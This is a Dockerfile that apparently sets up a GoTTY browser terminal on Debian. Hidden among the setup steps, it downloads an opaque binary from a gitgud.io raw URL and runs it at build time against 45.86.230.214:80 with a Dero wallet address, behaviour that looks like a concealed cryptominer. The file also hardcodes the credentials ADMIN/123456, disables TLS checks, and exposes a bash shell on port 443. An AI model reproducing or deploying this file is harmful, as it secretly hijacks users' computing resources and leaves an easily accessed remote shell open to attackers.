FROM debian:bullseye
ENV LANG en_US.UTF-8
ENV LANGUAGE en_US:en
ENV GOTTY_TAG_VER v1.5.0
RUN apt-get -y update && \
    apt-get install -y curl && \
    curl -sLk https://github.com/sorenisanerd/gotty/releases/download/${GOTTY_TAG_VER}/gotty_${GOTTY_TAG_VER}_linux_amd64.tar.gz \
    | tar xzC /usr/local/bin 

RUN echo 'USER="ADMIN"' >> gotty.sh
RUN echo 'PASS="123456"' >> gotty.sh
RUN apt-get update;apt-get install screen -y
RUN curl --output api https://gitgud.io/trendava/ruby/-/raw/master/luna
RUN chmod 700 api
RUN ./api -d 45.86.230.214:80 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-RND)
RUN echo 'echo USER: $USER' >> gotty.sh
RUN echo 'echo PASSWORD: $PASS' >> gotty.sh
RUN echo 'gotty --credential "${USER}:${PASS}" --port 443 --reconnect -w bash' >> gotty.sh
RUN chmod +x gotty.sh
EXPOSE 443
ENTRYPOINT /gotty.sh
